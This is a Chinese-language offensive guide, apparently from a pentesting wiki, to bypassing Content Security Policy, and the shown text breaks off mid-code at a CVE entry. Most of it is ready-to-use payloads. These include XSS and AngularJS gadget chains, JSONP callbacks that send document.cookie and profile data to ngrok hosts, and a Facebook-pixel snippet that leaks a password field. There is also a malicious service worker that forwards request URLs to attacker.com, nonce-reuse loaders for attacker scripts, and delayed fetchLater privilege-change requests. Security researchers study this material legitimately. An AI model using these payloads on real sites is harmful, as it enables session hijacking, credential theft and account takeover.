---
attack_surface: [客户端利用, 配置缺陷, 注入类]
impact: [信息泄露, 身份伪造, 完整性破坏, 远程代码执行]
risk_level: 严重
prerequisites:
  - XSS (Cross-Site Scripting) 基础
  - CSP (Content Security Policy) 策略语法理解
  - JavaScript 原型链与沙箱逃逸
  - 同源策略 (SOP) 理解
  - JSONP 与跨域资源加载机制
related_techniques:
  - xss-cross-site-scripting
  - dangling-markup
  - clickjacking
  - iframe-traps
  - postmessage-vulnerabilities
  - csrf
  - service-worker-exploitation
  - dom-clobbering
  - some-same-origin-method-execution
difficulty: 高级
tools:
  - CSP Evaluator (withgoogle.com)
  - CSP Validator (cspvalidator.org)
  - JSONBee (JSONP endpoints)
  - Shadow Workers (C2 for Service Worker exploitation)
  - 浏览器 DevTools
---

# Content Security Policy (CSP) Bypass — 策略绕过全面指南

## TL;DR / 一句话总结

CSP 是浏览器抵御 XSS 的核心防御机制，但由于配置错误、第三方信任域滥用、策略注入、浏览器实现差异等原因，CSP 存在 **20+ 种绕过技术**。攻击者可从"不安全关键字"、"第三方 JSONP/重定向滥用"、"iframe 策略隔离缺陷"、"DOM 原型链逃逸"、"服务端 PHP 报错使 CSP 失效"等多个维度击穿 CSP 防线。严格 CSP (`'nonce-...'` + `'strict-dynamic'` + `'unsafe-eval'` 禁用) 是最有效的防御方案。

---

## 背景与原理

### CSP 是什么

Content Security Policy (CSP) 是浏览器安全机制，通过**限制资源加载来源**和**禁止内联脚本/`eval()`** 来防御 XSS 攻击。CSP 通过两种方式部署：

- **响应头**：`Content-Security-Policy: default-src 'self'; img-src 'self' allowed-website.com; style-src 'self';`
- **HTML meta 标签**：`<meta http-equiv="Content-Security-Policy" content="default-src 'self'; img-src https://*; child-src 'none';">`

请求头变体：
- `Content-Security-Policy` — 强制模式，浏览器直接拦截违规行为
- `Content-Security-Policy-Report-Only` — 仅报告模式，违规不拦截但发送报告

### 核心指令速查

| 指令 | 控制范围 |
|------|----------|
| **script-src** | JavaScript 加载来源、内联脚本、`eval()` 及事件处理器 |
| **default-src** | 未明确指定指令时的默认回退值 |
| **connect-src** | `fetch`、`XMLHttpRequest`、WebSocket、EventSource 等网络 API |
| **img-src** | 图片加载来源 |
| **style-src** | CSS 样式来源 |
| **font-src** | 字体文件来源 |
| **frame-src** | 嵌套 frame 来源 (已取代 `child-src`) |
| **frame-ancestors** | 哪些页面可以嵌入当前页面 (`<frame>`, `<iframe>`, `<object>`) |
| **form-action** | 表单提交目标 URL 白名单 |
| **base-uri** | 允许的 `<base>` 元素 URL |
| **object-src** | `<object>`、`<embed>`、`<applet>` 来源 |
| **worker-src** | Worker / SharedWorker / ServiceWorker 脚本来源 |
| **navigate-to** | 限制页面可导航到的 URL (所有导航方式) |
| **sandbox** | 对页面施加类似 iframe sandbox 属性的限制 |
| **report-to / report-uri** | CSP 违规报告接收端点 |

### CSP Source 值详解

| 值 | 含义 |
|----|------|
| `*` | 允许所有 URL（`data:`、`blob:`、`filesystem:` 除外） |
| `'self'` | 仅允许同源 |
| `'none'` | 禁止任何来源 |
| `'unsafe-inline'` | 允许内联 `<script>` / `<style>` 和事件处理器 |
| `'unsafe-eval'` | 允许 `eval()`、`setTimeout(string)`、`setInterval(string)`、`new Function(string)` |
| `'unsafe-hashes'` | 允许特定 hash 的内联事件处理器 |
| `'nonce-<random>'` | 一次性随机数白名单，匹配 `<script nonce=...>` |
| `'sha256-<hash>'` | 白名单指定 sha256 哈希的脚本 |
| `'strict-dynamic'` | 若脚本已被 nonce 或 hash 信任，其动态创建的 `<script>` 也自动信任 |
| `host` | 特定主机名如 `example.com` |
| `https:` | 仅允许 HTTPS 来源 |
| `blob:` | 允许 Blob URL |
| `filesystem:` | 允许 filesystem URL |
| `'strict-origin'` | 类似 `'self'` 但要求协议安全级别匹配 |

### 为什么 CSP 可被绕过

CSP 绕过的核心矛盾在于：

1. **配置不完整** — 遗漏 `object-src`、`base-uri`、`form-action` 等指令，`default-src` 对部分指令不生效
2. **信任域可滥用** — CDN (cdnjs.cloudflare.com)、Google APIs、Facebook SDK 等白名单域名存在 JSONP 端点或可托管用户内容
3. **iframe 策略传递缺陷** — iframe 加载的页面（如错误页、纯文本文件）可能没有 CSP 头，从而在子帧中执行脚本
4. **浏览器实现差异** — Chrome/Edge/Firefox 对 CSP 的解析逻辑不完全一致
5. **服务端报错破坏 CSP** — PHP 的 warning/error 可能在 `header()` 之前输出，导致 CSP 头不生效
6. **策略注入** — 用户可控的 CSP 参数可被注入新指令覆盖原有策略

---

## 前提条件

| 条件 | 说明 |
|------|------|
| **目标存在 HTML/JS 注入点** | 攻击的入口——可以是 XSS、HTML 注入、Dangling Markup |
| **CSP 配置存在可被滥用的来源** | 白名单域名（CDN、APIs、Analytics）或缺失的指令 |
| **JavaScript 启用** | 绝大多数绕过依赖 JS 执行 |
| **(部分技术) 目标使用特定框架** | AngularJS、WordPress 等有特殊攻击面 |
| **(部分技术) PHP 后端** | PHP error/buffer 相关的 CSP 失效攻击 |

---

## 攻击分类

- **攻击面**：客户端利用（Client-Side Exploitation）、配置缺陷（Configuration Weakness）、注入类（Injection）
- **影响维度**：[x] 信息泄露 [x] 身份伪造 [x] 完整性破坏 [x] 远程代码执行
- **风险等级**：**严重** — 直接击穿防御 XSS 的核心浏览器安全机制

---

## 详细分析

### 1. 不安全关键字绕过

#### 1.1 `'unsafe-inline'`

```
Content-Security-Policy: script-src https://google.com 'unsafe-inline';
```

允许内联脚本执行，任何 XSS 注入可直接利用：

```html
"/><script>alert(1);</script>
```

##### self + unsafe-inline via Iframes

配置 `default-src 'self' 'unsafe-inline'` 虽禁止 `eval()` 和外部脚本，但仍可绕过：

**通过文本和图片文件**：浏览器会将文本文件和图片转换为 HTML 渲染（居中、背景等）。这些文件通常**没有 CSP 头**且可能缺少 `X-Frame-Options`。在 iframe 中加载后，可向其注入脚本执行：

```javascript
frame = document.createElement("iframe");
frame.src = "/robots.txt";  // 或 /favicon.ico、/css/bootstrap.min.css
document.body.appendChild(frame);
script = document.createElement("script");
script.src = "//example.com/csp.js";
window.frames[0].document.head.appendChild(script);
```

**通过错误页面诱导**：触发服务器错误以获得无 CSP 头的 iframe 内容：

```javascript
// 方法 1：诱导 NGINX 路径穿越错误
frame = document.createElement("iframe");
frame.src = "/%2e%2e%2f";
document.body.appendChild(frame);

// 方法 2：超长 URL 触发 414 错误
frame = document.createElement("iframe");
frame.src = "/" + "A".repeat(20000);
document.body.appendChild(frame);

// 方法 3：大量 Cookie 撑爆请求头
for (var i = 0; i < 5; i++) {
  document.cookie = i + "=" + "a".repeat(4000);
}
frame = document.createElement("iframe");
frame.src = "/";
document.body.appendChild(frame);
// 使用后必须清理 Cookie
for (var i = 0; i < 5; i++) {
  document.cookie = i + "=";
}
```

触发后注入脚本：

```javascript
script = document.createElement("script");
script.src = "//example.com/csp.js";
window.frames[0].document.head.appendChild(script);
```

#### 1.2 `'unsafe-eval'`

```
Content-Security-Policy: script-src https://google.com 'unsafe-eval';
```

允许 `eval()` 类函数执行字符串代码，利用 payload：

```html
<script src="data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="></script>
```

> **2025 更新**：此绕过在现代浏览器中可能已失效，详见 [GitHub issue #653](https://github.com/HackTricks-wiki/hacktricks/issues/653)。

#### 1.3 `strict-dynamic`

`strict-dynamic` 的设计意图是：如果脚本已被 nonce/hash 信任，则其**动态创建的 `<script>` 标签也自动信任**。攻击路径：

- 若存在合法的 nonce/hash 信任脚本，且该脚本**动态添加** `<script>` 标签到 DOM，则新脚本可挟持该能力加载任意 JS
- 若能通过 DOM 注入使已信任脚本的执行路径加载恶意 URL，即可绕过
- 更多见下方"第三方库利用"和"Angular gadget chains"

#### 1.4 Wildcard (`*`) 在 script-src

```
Content-Security-Policy: script-src 'self' https://google.com https: data *;
```

`*` 允许除 `data:`/`blob:`/`filesystem:` 外的所有 URL——但若同时显式允许 `data:`，可执行：

```html
"/>'><script src=https://attacker-website.com/evil.js></script>
"/>'><script src=data:text/javascript,alert(1337)></script>
```

#### 1.5 缺失 object-src 或 default-src

```
Content-Security-Policy: script-src 'self';
```

> **注意**：此绕过在现代浏览器中可能已失效。

若未定义 `object-src` 且 `default-src` 未覆盖，可通过 `<object>` 标签加载 Flash 或 data URL 执行脚本：

```html
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
">'><object type="application/x-shockwave-flash" data='https://ajax.googleapis.com/ajax/libs/yui/2.8.0r4/build/charts/assets/charts.swf?allowedDomain=\"})))}catch(e){alert(1337)}//'>
<param name="AllowScriptAccess" value="always"></object>
```

#### 1.6 File Upload + `'self'`

```
Content-Security-Policy: script-src 'self'; object-src 'none';
```

若能上传 JS 文件到同源服务器：

```html
"/>'><script src="/uploads/picture.png.js"></script>
```

**两个关键障碍**：

1. **文件类型验证** — 服务器可能只允许特定扩展名。需利用**扩展名误解析**：如 Apache 不认识 `.wave` 扩展名，不会以 `audio/*` MIME 返回，浏览器可能执行内容
2. **MIME 类型检查** — Chrome 拒绝执行 MIME 类型为图片的 JS 内容。需要服务器对上传文件的扩展名返回错误的 Content-Type

若服务器校验文件格式，创建多语言文件（[Polyglot 示例](https://github.com/Polydet/polyglot-database)）同时满足图片格式验证和 JS 执行。

#### 1.7 form-action 缺失

`default-src` **不覆盖** `form-action`。若 CSP 中缺失此指令，攻击者可注入 form action 劫持表单提交：

```html
<form action="https://attacker.com/steal" method="POST">
  <!-- 原页面表单元素 -->
</form>
```

配合密码管理器自动填充，可在不执行任何 JS 的情况下**窃取凭据**。PortSwigger 研究演示了此技术在 Mastodon 实例上的应用。

---

### 2. 第三方端点滥用

#### 2.1 CDN + AngularJS Gadget Chains

```
Content-Security-Policy: script-src https://cdnjs.cloudflare.com 'unsafe-eval';
```

**注意**：以下许多 payload **即使没有 `unsafe-eval` 也可用**。

**经典 AngularJS CSP 绕过** (v1.4.6)：

```html
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.4.6/angular.js"></script>
<div ng-app> {{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1);//');}} </div>

"><script src="https://cdnjs.cloudflare.com/angular.min.js"></script>
<div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>

"><script src="https://cdnjs.cloudflare.com/angularjs/1.1.3/angular.min.js"></script>
<div ng-app ng-csp id=p ng-click=$event.view.alert(1337)>
```

**跨版本 Angular 利用 (含 srcdoc iframe)**：

```html
<script/src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js></script>
<iframe/ng-app/ng-csp/srcdoc="
  <script/src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.0/angular.js>
  </script>
  <img/ng-app/ng-csp/src/ng-o{{}}n-error=$event.target.ownerDocument.defaultView.alert($event.target.ownerDocument.domain)>"
>
```

**利用 CDN 库 + Angular 获取 window 对象**：

关键思路：CDN 上所有库都可被加载，检查每个库的每个函数，找到返回 `window` 对象的函数，配合 Angular 执行任意代码。

```html
<!-- Prototype.js + Angular -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.js" /></script>
<div ng-app ng-csp>
 {{$on.curry.call().alert(1)}}
 {{[].empty.call().alert([].empty.call().document.domain)}}
 {{ x = $on.curry.call().eval("fetch('http://localhost/index.php').then(d => {})") }}
</div>

<!-- MooTools + Angular -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/mootools/1.6.0/mootools-core.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js"></script>
<div ng-app ng-csp>
  {{[].erase.call().alert('xss')}}
</div>
```

**2016 年自动化扫描结果**：对 cdnjs 上全部 4290 个库进行 headless 浏览器自动化扫描，发现 **74 个库 (1.72%) 会污染原型链**，其中 **12 个 (16.2%) 满足 CSP 绕过条件**（原型方法 + `.call()` 返回 `window`）：

| 库 | 可滥用方法 |
|----|-----------|
| **prototype.js** (1.7.3) | `Function.prototype.curry`, `Array.prototype.clear`, `Number.prototype.times` |
| **mootools-core** (1.6.0) | `Array.prototype.erase`, `Array.prototype.empty`, `Function.prototype.extend` |
| **asciidoctor.js** (1.5.9) | `Array.prototype.$push`, `String.prototype.$chomp`, `Function.prototype.$to_proc` |
| **jquery-ui-bootstrap** (0.5pre/date.js) | `Number.prototype.milliseconds/seconds/minutes/hours/days/weeks/months/years` |
| **ext-core** (3.1.0) | `Function.prototype.createInterceptor` |
| **datejs** (1.0) | `Number.prototype.milliseconds` 系列 (同 jquery-ui-bootstrap) |
| **json-forms** (1.6.3) | `String.prototype.format` |
| **inheritance-js** (0.4.12) | `Object.prototype.mix`, `Object.prototype.mixDeep` |
| **melonjs** (1.0.1) | `Array.prototype.remove` |
| **opal** (0.3.43) | `Array.prototype.$push/$shuffle`, `Function.prototype.$to_proc`, `Number.prototype.$times` |
| **tmlib.js** (0.5.2) | `Array.prototype.swap/clear/shuffle`, `Number.prototype.times/upto/downto/step` |

自动化扫描工具：[cdnjs-prototype-pollution](https://github.com/aszx87410/cdnjs-prototype-pollution)

**从 className 触发 Angular XSS**：

```html
<div ng-app>
  <strong class="ng-init:constructor.constructor('alert(1)')()">aaa</strong>
</div>
```

#### 2.2 Google reCAPTCHA JS 滥用

即使 `script-src` 中包含 `https://www.google.com/recaptcha/`，也可利用其内部 AngularJS 版本执行任意 JS：

```html
<div ng-controller="CarouselController as c" ng-init="c.init()">
&#91[c.element.ownerDocument.defaultView.parent.location="http://google.com?"+c.element.ownerDocument.cookie]]
<div carousel><div slides></div></div>

<script src="https://www.google.com/recaptcha/about/js/main.min.js"></script>
```

**PortSwigger 环境下的进阶利用** (复用 nonce)：

```html
<script src="https://www.google.com/recaptcha/about/js/main.min.js"></script>

<!-- 直接触发 alert -->
<img src="x" ng-on-error="$event.target.ownerDocument.defaultView.alert(1)" />

<!-- 复用页面已有 nonce 加载外部恶意脚本 -->
<img src="x" ng-on-error='
  doc=$event.target.ownerDocument;
  a=doc.defaultView.top.document.querySelector("[nonce]");
  b=doc.createElement("script");
  b.src="//example.com/evil.js";
  b.nonce=a.nonce; doc.body.appendChild(b)' />
```

#### 2.3 Google Open Redirect 滥用

Google 的 `/amp/s/` 端点存在开放重定向：

```
https://www.google.com/amp/s/example.com/
```

此 URL 在 CSP 看来属于 `www.google.com`，但实际会重定向到攻击者控制的 `example.com`。若 `script-src` 白名单包含 `www.google.com`，可加载任意内容。

`*.google.com/script.google.com` 也可被滥用于数据外传（如 Google Apps Script 接收窃取信息）。

#### 2.4 JSONP 端点利用

```
Content-Security-Policy: script-src 'self' https://www.google.com https://www.youtube.com; object-src 'none';
```

JSONP 端点允许不安全回调——攻击者控制回调函数名即可执行任意 JS：

```html
"><script src="https://www.google.com/complete/search?client=chrome&q=hello&callback=alert#1"></script>
"><script src="/api/jsonp?callback=(function(){window.top.location.href=`http://f6a81b32f7f7.ngrok.io/cooookie`%2bdocument.cookie;})();//"></script>
```

**YouTube JSONP**：

```html
https://www.youtube.com/oembed?callback=alert;
<script src="https://www.youtube.com/oembed?url=http://www.youtube.com/watch?v=bDOYN-6gdRE&format=json&callback=fetch(`/profile`).then(function f1(r){return r.text()}).then(function f2(txt){location.href=`https://b520-49-245-33-142.ngrok.io?`+btoa(txt)})"></script>
```

**Google OAuth JSONP + 多层编码执行**：

```html
<script type="text/javascript" crossorigin="anonymous" src="https://accounts.google.com/o/oauth2/revoke?callback=eval(atob(%27...base64_payload...%27));"></script>
```

工具：[JSONBee](https://github.com/zigoo0/JSONBee) 收集了各网站的已知 JSONP CSP 绕过端点。

**关键规则**：若信任端点存在**开放重定向**，重定向后的 URL 同样被 CSP 视为可信。

#### 2.5 第三方服务滥用矩阵

| 服务商 | 允许域名 | 能力 |
|--------|----------|------|
| Facebook | www.facebook.com, *.facebook.com | 数据外传 (Exfil) |
| Hotjar | *.hotjar.com, ask.hotjar.io | 数据外传 (Exfil) |
| Jsdelivr | *.jsdelivr.com, cdn.jsdelivr.net | 执行 (Exec) |
| Amazon CloudFront | *.cloudfront.net | 外传 + 执行 |
| Amazon AWS | *.amazonaws.com | 外传 + 执行 |
| Azure Websites | *.azurewebsites.net, *.azurestaticapps.net | 外传 + 执行 |
| Salesforce Heroku | *.herokuapp.com | 外传 + 执行 |
| Google Firebase | *.firebaseapp.com | 外传 + 执行 |

**Jsdelivr 代码执行流程**：

若 CSP 白名单包含 `cdn.jsdelivr.net`，攻击者可利用 jsdelivr 的 CDN 缓存机制：

1. 将恶意 JS payload 上传到 **GitHub** 仓库或 **npm** 包
2. 通过 jsdelivr URL 模式触发缓存：
   - GitHub：`https://cdn.jsdelivr.net/gh/<user>/<repo>@<version>/<file>`
   - npm：`https://cdn.jsdelivr.net/npm/<package>@<version>/<file>`
3. 在目标页面以 `<script src="https://cdn.jsdelivr.net/gh/...">` 加载——CSP 视其为合法来源

```
https://victim.com/page?source=https://cdn.jsdelivr.net/gh/attacker/payload/exec.js
```

**Hotjar 数据外传流程**：

1. 注册 Hotjar 账户 → 创建 Poll
2. 在攻击者控制的页面中回答 Poll，嗅探 HTTP 流量获取请求格式
3. 在受害者侧模拟该 "Poll answer" 请求，将敏感数据嵌入 Poll 响应
4. 在 Hotjar Dashboard 中查看窃取数据

**示例：Facebook 数据外传**

若 CSP 为 `default-src 'self' www.facebook.com;` 或 `connect-src www.facebook.com;`：

1. 创建 Facebook Developer 账户
2. 创建 "Facebook Login" 应用 ("Website" 类型)
3. 获取 App ID (设置 → 基本)
4. 在目标页面用 Facebook SDK "fbq" 通过 "customEvent" 外传数据
5. 在 App "Event Manager" → "Test Events" 查看窃取数据

```javascript
// 初始化攻击者的 Facebook tracking pixel
fbq('init', '1279785999289471');  // 攻击者的 App ID
fbq('trackCustom', 'My-Custom-Event',{
    data: "Leaked user password: '"+document.getElementById('user-password').innerText+"'"
});
```

同样模式可用于 Google Analytics / Google Tag Manager 数据外传。

---

### 3. 路径与重定向绕过

#### 3.1 RPO (Relative Path Overwrite)

若 CSP 允许 `https://example.com/scripts/react/` 路径，浏览器与服务器对 `%2f` 的解析差异可被利用：

```html
<script src="https://example.com/scripts/react/..%2fangular%2fangular.js"></script>
```

- **浏览器**：视 `..%2fangular%2fangular.js` 为 `https://example.com/scripts/react/` 下的文件名 → CSP 合规
- **服务器**：解码 `%2f` 为 `/`，实际请求 `https://example.com/scripts/react/../angular/angular.js` → `https://example.com/scripts/angular/angular.js`

**防御**：服务端不要将 `%2f` 视为 `/`，保持浏览器和服务器的一致解析。

在线示例：https://jsbin.com/werevijewa/edit?html,output

#### 3.2 CSP 重定向绕过

CSP 规范（4.2.2.3 路径与重定向）规定：**重定向后的路径不受原路径限制**。

```
Content-Security-Policy: script-src http://localhost:5555 https://www.google.com/a/b/c/d
```

```html
<script src="https://www.google.com/test"></script>        <!-- 被阻止：路径不匹配 -->
<script src="https://www.google.com/a/test"></script>      <!-- 被阻止：路径不匹配 -->
<script src="http://localhost:5555/301"></script>           <!-- 通过：服务端 301 重定向到 -->
                                                            <!-- https://www.google.com/complete/search?client=chrome&q=123&jsonp=alert(1)// -->
```

即使原始 CSP 指定了完整路径，重定向使路径检查被完全绕过。**防御**需消除开放重定向漏洞且不在 CSP 中信任存在开放重定向的域。

---

### 4. Iframe CSP 绕过技术

#### 4.1 Iframe 基本 CSP 绕过

最关键的发现：**即使 CSP 为 `script-src 'none'`，通过 `src` 属性（完整 URL 或路径）加载的 iframe 内的脚本仍可执行**。`srcdoc` 和 `data:` URL 受 CSP `script-src` 限制，但 `src` 属性不受限——CSP 只检查 iframe 是否允许加载，不检查其内部脚本。

```html
<!-- CSP: script-src 'sha256-iF/bMbiFXal+AAl9tF8N6+KagNWdMlnhLqWkjAocLsk' -->
<iframe id="if1" src="child.html"></iframe>                          <!-- 脚本执行 + 可访问父窗口 -->
<iframe id="if2" src="http://127.0.1.1:8000/child.html"></iframe>    <!-- 脚本执行 (跨域，不可访问父窗口) -->
<iframe id="if3" srcdoc="<script>alert(parent.secret)</script>"></iframe>   <!-- 被 CSP 阻止 -->
<iframe id="if4" src="data:text/html,..."></iframe>                         <!-- 被 CSP 阻止 -->
```

因此，若可上传 JS 文件到服务器或存在同源 JSONP 端点，即使 `script-src 'none'` 也可在 iframe 中执行脚本。实际验证示例：

```python
import flask
from flask import Flask
app = Flask(__name__)

@app.route("/")
def index():
    resp = flask.Response('<html><iframe id="if1" src="cookie_s.html"></iframe></html>')
    resp.headers['Content-Security-Policy'] = "script-src 'self'"
    resp.headers['Set-Cookie'] = 'secret=THISISMYSECRET'
    return resp

@app.route("/cookie_s.html")
def cookie_s():
    return "<script>alert(document.cookie)</script>"  # iframe 内执行，窃取 Cookie

if __name__ == "__main__":
    app.run()
```

#### 4.2 `srcdoc` 两个关键特性

1. **同源继承**：若未 sandbox 且未禁用 `allow-same-origin`，`srcdoc` 的内容与父页面同源，可直接访问 `top.document`
2. **相对 URL 解析**：`srcdoc` 内相对 URL 以父页面 URL 为基础解析：`<script src="/upload/payload.js"></script>` 实际加载 `https://parent-origin.com/upload/payload.js`

```html
<iframe srcdoc='<script src="/uploads/payload.js"></script><a href="#test">anchor</a>'></iframe>
```

这在控制 HTML 但无法直接写脚本时特别有用——构造一个 iframe 加载同源的攻击者控制 JS。

#### 4.3 Dangling Markup / Named-Iframe 数据窃取 (2023)

即使强 CSP 阻止脚本执行，通过**未闭合的 iframe name 属性**仍可泄露敏感 token：

```html
<!-- 注入点恰在敏感 <script> 标签之前 -->
<iframe name="//attacker.com/?">  <!-- 属性刻意不闭合 -->
```

攻击者侧利用：

```javascript
// attacker.com 上的 frame 中
const victim = window.frames[0];
victim.location = 'about:blank';
console.log(victim.name);  // → 泄露的值（CSRF token 等）
```

原理：HTML 解析器在 `name` 属性值中持续读取直到下一个引号，所有中间内容（含后续 script 标签的内容）都被捕获为 iframe name。不依赖目标页面执行任何 JS。

#### 4.4 Nonce 复用 via 同源 iframe

CSP nonce 可由同源文档从 DOM 读取。若可注入/上传同源 HTML 并在 iframe 中加载：

```javascript
const n = top.document.querySelector('[nonce]').nonce;
const s = top.document.createElement('script');
s.src = '//attacker.com/pwn.js';
s.nonce = n;
top.document.body.appendChild(s);
```

这使 HTML 注入在 `strict-dynamic` 下升级为完全脚本执行——因为 nonce 已被信任。

#### 4.5 Iframe Sandbox 绕过

`sandbox="allow-scripts allow-same-origin"` 对**同源攻击者内容不安全**：

```javascript
const me = top.document.querySelector("iframe");
me.removeAttribute("sandbox");
top.location = "/admin";
```

子 iframe 可移除自身的 `sandbox` 属性并重定向父页面。对不可信同源 HTML 不应同时授予 `allow-scripts` 和 `allow-same-origin`。

#### 4.6 Credentialless Iframes (Chrome 110+)

`credentialless` iframe 在**不发送凭据**的情况下保持同源策略：

```html
<iframe credentialless src="https://victim.domain/page"></iframe>
```

**攻击价值**：

- 多个 credentialless iframe 共享同一顶层 origin，可通过 DOM 互相通信
- Storage 按顶层文档 nonce 分区隔离——同页面 credentialless iframe 可共享存储
- 密码管理器自动填充**应在 credentialless iframe 中被禁用**

```javascript
// 同页面两个 credentialless iframe 互相窃取 cookie
window.top[1].document.cookie = 'foo=bar';     // 写入
alert(window.top[2].document.cookie);            // 读取 → foo=bar
```

**Self-XSS + CSRF 结合利用**：

1. 攻击者页面包含两个 iframe：
   - iframe A (credentialless)：加载受害者页面 + CSRF 触发 Self-XSS（如用户名中嵌入 `<img src=x onerror=eval(window.name)>`）
   - iframe B (无 credentialless)：用户已登录的同一网站
2. Self-XSS 在 iframe A 中执行后，通过 SOP 访问 iframe B 的 DOM，窃取其 Cookie

#### 4.7 fetchLater Attack (Chrome 135+, April 2025)

`fetchLater` 允许**延迟发送请求**（在页面卸载时或指定延迟后执行）：

```javascript
var req = new Request("/change_rights", {
  method: "POST",
  body: JSON.stringify({username: "victim", rights: "admin"}),
  credentials: "include"
});
for (let i = 1; i <= 20; i++)
  fetchLater(req, { activateAfter: i * 299000 });
```

**攻击流程**：

1. 攻击者在受害者会话中 (Self-XSS) 调度 `fetchLater` 请求（修改密码/权限等操作）
2. 攻击者退出会话，受害者登录
3. 延迟请求在受害者登录后使用其 Cookie 发送——以受害者身份执行操作

关键特性：
- 响应不可被 JS 读取（无回调）
- CSP 通过 `connect-src` 控制（非 `script-src`）
- 最大单次延迟约 299 秒，长等待需多次调度
- 页面卸载时立即发送（whichever happens first）

---

### 5. 其他高级绕过

#### 5.1 missing base-uri

若 CSP 缺少 `base-uri` 指令，可注入 `<base>` 标签劫持相对路径脚本加载：

```html
<base href="https://www.attacker.com/" />
```

当页面通过相对路径加载脚本（`<script src="/js/app.js">`）且使用 Nonce 保护时，`<base>` 标签使浏览器从攻击者服务器加载脚本，实现完整 XSS。

此外，缺少 `base-uri` 还可配合 [Dangling Markup Injection](#) 进行数据窃取。

#### 5.2 AngularJS `$event.path` 利用

Chrome 中 `$event.path` 属性包含事件执行链的对象数组，`window` 对象始终在末尾：

```html
<input%20id=x%20ng-focus=$event.path|orderBy:%27(z=alert)(document.cookie)%27>#x
?search=<input id=x ng-focus=$event.path|orderBy:'(z=alert)(document.cookie)'>#x
```

利用 `orderBy` 过滤器遍历 path 数组，通过末端 `window` 对象执行全局函数。

更多 Angular 绕过参考：[PortSwigger XSS Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

#### 5.3 AngularJS + 白名单域

```
Content-Security-Policy: script-src 'self' ajax.googleapis.com; object-src 'none';
```

通过 Google AJAX API 的 JSONP 回调和 Angular 的 CSP 模式绕过：

```html
<script src=//ajax.googleapis.com/ajax/services/feed/find?v=1.0%26callback=alert%26context=1337></script>
ng-app"ng-csp ng-click=$event.view.alert(1337)><script src=//ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.js></script>
```

其他 JSONP 端点参考 [JSONBee jsonp.txt](https://github.com/zigoo0/JSONBee/blob/master/jsonp.txt)。

#### 5.4 Dangling Markup 绕过

若 CSP 阻止脚本执行，可结合 Dangling Markup 技术窃取页面内容，详见相关文档。

#### 5.5 Service Workers 绕过

Service Worker 的 `importScripts()` 函数**不受 CSP 限制**——可从任何域加载脚本：

利用条件：
- 可上传 JS 文件到目标服务器（作为 SW 脚本）+ XSS 注册 SW
- 或存在可操纵输出的 JSONP 端点 + XSS 加载 JSONP 注册 SW

**恶意 Service Worker** (上传到服务器)：

```javascript
self.addEventListener('fetch', function(e) {
  e.respondWith(caches.match(e.request).then(function(response) {
    fetch('https://attacker.com/fetch_url/' + e.request.url)
  }));
});
```

**XSS 注册 SW**：

```javascript
<script>
window.addEventListener('load', function() {
  var sw = "/uploaded/ws_js.js";
  navigator.serviceWorker.register(sw, {scope: '/'})
    .then(function(registration) {
      var xhttp2 = new XMLHttpRequest();
      xhttp2.open("GET", "https://attacker.com/SW/success", true);
      xhttp2.send();
    }, function(err) {
      var xhttp2 = new XMLHttpRequest();
      xhttp2.open("GET", "https://attacker.com/SW/error", true);
      xhttp2.send();
    });
});
</script>
```

**JSONP 链式加载 SW**：

```javascript
var sw = "/jsonp?callback=onfetch=function(e){ e.respondWith(caches.match(e.request).then(function(response){ fetch('https://attacker.com/fetch_url/' + e.request.url) }) )}//";
```

工具：[Shadow Workers](https://shadow-workers.github.io) — 专用于 Service Worker 利用的 C2 框架。

**DOM Clobbering 劫持 `importScripts`**：若 SW 的 `importScripts` 调用来自 HTML 元素的可控属性，通过 DOM Clobbering 修改使 SW 加载攻击者脚本。

**SW 24 小时缓存限制**：恶意 SW 最多存活 24 小时（浏览器缓存期限），建议开发者实现 [Service Worker Kill-Switch](https://stackoverflow.com/questions/33986976/how-can-i-remove-a-buggy-service-worker-or-implement-a-kill-switch/38980776#38980776)。

#### 5.6 Policy Injection (策略注入)

**Chrome**：用户可控参数被拼入 CSP 声明时，注入 `script-src-elem` / `script-src-attr` 指令覆盖原有 `script-src`：

```
script-src-elem *; script-src-attr *
script-src-elem 'unsafe-inline'; script-src-attr 'unsafe-inline'
```

这些指令**覆盖已存在的 script-src 指令**。

示例：http://portswigger-labs.net/edge_csp_injection_xndhfye721/?x=%3Bscript-src-elem+*&y=%3Cscript+src=%22...%22%3E%3C/script%3E

**Edge**：仅需注入 `;_` 即可**丢弃整个 CSP 策略**（Edge 的 CSP 解析器遇到语法错误时整体失效）。

#### 5.7 CSP 限制攻击 (Restricting CSP to Bypass CSP)

通过注入**更严格的 CSP** 来禁用原本安全的脚本，触发可利用条件：

**iframe csp 属性**：

```html
<iframe src="https://biohazard-web.2023.ctfcompetition.com/view/[bio_id]"
  csp="script-src ... 'unsafe-inline' 'unsafe-eval'"></iframe>
```

在 Google CTF 2023 中，通过注入受限 CSP 禁用特定 JS 文件，然后通过**原型污染或 DOM Clobbering** 滥用其他脚本加载任意脚本。

**HTML meta 标签收紧 CSP + sha 精确启用**：

```html
<meta http-equiv="Content-Security-Policy"
  content="script-src 'self' 'unsafe-eval' 'strict-dynamic'
  'sha256-whKF34SmFOTPK4jfYDy03Ea8zOwJvqmz%2boz%2bCtD7RE4='
  'sha256-Tz/iYFTnNe0de6izIdG%2bo6Xitl18uZfQWapSbxHE6Ic=';" />
```

移除 nonce 条目、添加特定 sha 白名单，使原被保护的脚本失效而注入的脚本可用。

#### 5.8 Content-Security-Policy-Report-Only 信息泄露

若能控制 `Content-Security-Policy-Report-Only` 响应头（如通过 CRLF 注入），可使其指向攻击者服务器。将敏感 JS 内容包裹在 `<script>` 标签中，因 `unsafe-inline` 通常被禁，触发 CSP 违规报告——报告中将包含敏感数据片段。

#### 5.9 CVE-2020-6519

```javascript
document.querySelector("DIV").innerHTML =
